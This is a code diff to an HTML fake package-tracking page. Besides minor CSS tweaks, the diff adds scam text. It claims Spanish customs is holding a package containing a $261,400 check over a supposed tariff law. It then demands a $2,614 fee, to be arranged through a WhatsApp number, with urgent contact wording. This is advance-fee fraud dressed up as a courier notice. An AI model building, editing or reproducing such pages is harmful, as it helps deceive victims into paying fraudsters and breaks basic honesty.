@@ -21,7 +21,7 @@
             padding: 2rem;
             border-radius: 15px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
-            width: 400px;
+            width: 450px;
             text-align: center;
         }
 
@@ -63,6 +63,8 @@
             background: rgba(253, 187, 45, 0.2);
             border-radius: 10px;
             display: none;
+            text-align: left;
+            font-size: 0.95rem;
         }
 
         .status {
@@ -92,26 +94,33 @@
             margin-bottom: 15px;
             font-size: 1.1rem;
         }
+
+        .contact {
+            margin-top: 10px;
+            font-style: italic;
+        }
     </style>
 </head>
 <body>
     <div class="tracking-container">
         <div class="header">Package Tracking</div>
         
-        <!-- Prompt instead of showing tracking number -->
         <p class="prompt">Please enter your tracking number below</p>
         
         <input type="text" id="trackInput" placeholder="Enter Tracking Number">
         <button onclick="trackPackage()">Track Package</button>
         
         <div class="tracking-info" id="trackingInfo">
-            <p>From: Nebraska, USA</p>
-            <p>To: Valencia, Spain</p>
-            <div class="status">Status: In Transit</div>
+            <p><strong>From:</strong> Nebraska, USA</p>
+            <p><strong>To:</strong> Valencia, Spain</p>
+            <div class="status">Status: Held by Customs</div>
+            <p>We’ve been trying to contact you about this shipment. Spanish customs has detained your package due to a recently passed Trump tariff law requiring full payment of tariffs on international shipments from the USA. Your shipment includes a check for $261,400, and customs will not release it until a 1% tariff fee of $2,614 is paid. This fee must be settled to clear your package for delivery.</p>
+            <p><strong>Next Step:</strong> Please contact us immediately to arrange payment of the $2,614 tariff fee so we can coordinate with customs for release.</p>
+            <div class="contact"><strong>Contact Us:</strong> Call or message us via WhatsApp at +1 (408) 802-1081. We speak English only, and we understand you are an English speaker.</div>
             <div class="progress-bar">
                 <div class="progress"></div>
             </div>
-            <p>Estimated Delivery: April 10, 2025</p>
+            <p><strong>Delivery Status:</strong> Pending Customs Clearance</p>
         </div>
     </div>
 
